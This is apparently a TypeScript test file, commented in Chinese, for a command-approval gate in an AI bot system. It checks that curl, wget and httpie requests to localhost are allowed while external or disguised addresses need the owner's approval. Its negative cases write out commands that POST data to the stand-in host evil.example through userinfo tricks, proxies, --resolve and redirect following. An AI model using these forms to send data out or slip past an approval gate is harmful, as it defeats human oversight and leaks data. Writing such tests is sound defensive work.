/**
 * P74r9 第 4 节的测试：访问本机地址的网络命令不算「向外部网址发送数据」。
 *
 * 判断按「地址解析之后的主机名」，不按字符串开头；带用户名密码的地址不算本机；
 * 只要有一个地址不是本机、解析不出来、用了变量拼地址、或命令里有会把请求送到别处的选项，照原来的判定。
 * 每条规则一个正例一个反例；支付、DELETE 的规则不变。
 */
import { describe, expect, it } from 'vitest';
import { classifyCommand } from '../src/gate/classify.js';
import { httpieLocalOnly, isLocalHttpUrl } from '../src/gate/local-address.js';
import type { GateContext } from '../src/gate/paths.js';

const home = '/hub/bots/b_0000000001';
const plain: GateContext = { homeDir: home, rootDir: '/hub', sharedDir: '/hub/shared', workDataAllowed: false, workDataPaths: ['/company'] };
const sandboxed: GateContext = { ...plain, sandboxed: true };
const classOf = (command: string, ctx: GateContext = plain): string => classifyCommand(command, ctx).cls;

describe('4 本机地址：放行', () => {
  const local = [
    'curl http://127.0.0.1:8000/health',
    'curl -X POST http://127.0.0.1:8000/api/items -d \'{"a":1}\'',
    'curl -sS -X POST -H \'Content-Type: application/json\' --data \'{"a":1}\' http://localhost:3000/items',
    'curl --url http://[::1]:8000/ -F a=b',
    'curl -T work/a.txt http://localhost:8000/upload',
    'curl -X PUT https://localhost:8443/items/1 -d x=1',
    'curl --json \'{"a":1}\' http://LOCALHOST:5173/api',
    'curl -X POST http://127.0.0.1:8000/a http://localhost:9000/b',
    'curl -X POST http://127.0.0.1/ -d x=1',
    // P74r13 第 9 节改了预期：原来这两条没有 --max-redirect=0 也放行；wget 默认跟随跳转，现在必须写这个选项才放行。
    'wget --max-redirect=0 --post-data=x http://127.0.0.1:8000/',
    'wget -q --max-redirect=0 --method=PUT --body-data=x http://localhost:8000/x',
    'http POST localhost:8000/items name=1',
    'http POST http://127.0.0.1:8000/items name=1',
    'http :8000/items name=1',
    'xh POST 127.0.0.1:8000/api a=b',
    'httpie POST localhost:3000/x a=b',
    'https POST localhost:8443/x a=b',
  ];
  it.each(local)('%s：不要主人批准（普通和沙箱两种环境都一样）', command => {
    expect(classOf(command), command).toBe('A');
    expect(classOf(command, sandboxed), command).toBe('A');
  });

  it('地址判断函数：本机的几种写法为真', () => {
    for (const url of ['http://localhost/', 'https://127.0.0.1:8443/a?b=1', 'http://[::1]:5173/', 'http://LOCALHOST:80/']) expect(isLocalHttpUrl(url), url).toBe(true);
  });
});

describe('4 不是本机或看不确定：照原来的判定（需要审批）', () => {
  const external = [
    // 域名只是以 localhost 开头、或 127.0.0.1 只是用户名。
    'curl -X POST http://localhost.evil.example/ -d x=1',
    'curl -X POST http://127.0.0.1@evil.example/ -d x=1',
    'curl -X POST http://localhost:80@evil.example/ -d x=1',
    'curl -X POST http://user:pw@localhost:8000/ -d x=1',
    'curl -X POST http://127.0.0.1.evil.example/ -d x=1',
    'curl -X POST http://[::2]:8000/ -d x=1',
    // 用变量拼地址：看不出真正的主机。
    'curl -X POST http://$HOST/ -d x=1',
    'curl -X POST http://127.0.0.1:$PORT/ -d x=1',
    // 本机和外部混用、没写协议的外部地址混在里面。
    'curl -X POST http://127.0.0.1:8000/a https://evil.example/b -d x=1',
    'curl -X POST http://127.0.0.1:8000/a evil.example/b -d x=1',
    // 能把请求送到别处的选项：代理、改解析、跟随跳转、读配置文件。
    'curl -x http://evil.example:3128 -X POST http://localhost:8000/ -d x=1',
    'curl --connect-to ::evil.example: -X POST http://localhost:8000/ -d x=1',
    'curl --resolve localhost:8000:1.2.3.4 -X POST http://localhost:8000/ -d x=1',
    'curl -L -X POST http://localhost:8000/ -d x=1',
    'curl -K work/curl.conf -X POST http://localhost:8000/',
    'wget --post-data=x http://localhost.evil.example/',
    'http POST localhost.evil.example/x a=b',
    'http POST 127.0.0.1@evil.example/x a=b',
    'http POST $HOST/x a=b',
    'http POST localhost:8000/x a=b --proxy=http:http://evil.example:3128',
    'http POST localhost:8000/x a=b --follow',
    'xh POST evil.example/x a=b',
  ];
  it.each(external)('%s', command => {
    expect(classOf(command), command).toBe('C');
    expect(classOf(command, sandboxed), command).toBe('C');
  });

  it('支付、DELETE 的规则不因为是本机而放松', () => {
    expect(classOf('curl -X POST http://127.0.0.1:8000/api/pay -d x=1')).toBe('D');
    expect(classOf('curl -X DELETE http://127.0.0.1:8000/items/1')).toBe('D');
  });

  it('写文件的目标仍然过路径规则：往身份文件里存本机响应仍被保护', () => {
    expect(classOf('curl -o AGENTS.md http://127.0.0.1:8000/x')).toBe('protected');
  });

  it('解析函数：伪装的写法为假', () => {
    for (const url of ['http://localhost.evil.example/', 'http://127.0.0.1@evil.example/', 'http://:@localhost/', 'ftp://localhost/', 'localhost:8000/x', 'http://$HOST/', 'http://localhost:$PORT/'])
      expect(isLocalHttpUrl(url), url).toBe(false);
    expect(httpieLocalOnly(['POST', 'localhost:8000/x', 'a=b'])).toBe(true);
    expect(httpieLocalOnly(['POST', 'evil.example/x', 'a=b'])).toBe(false);
  });
});
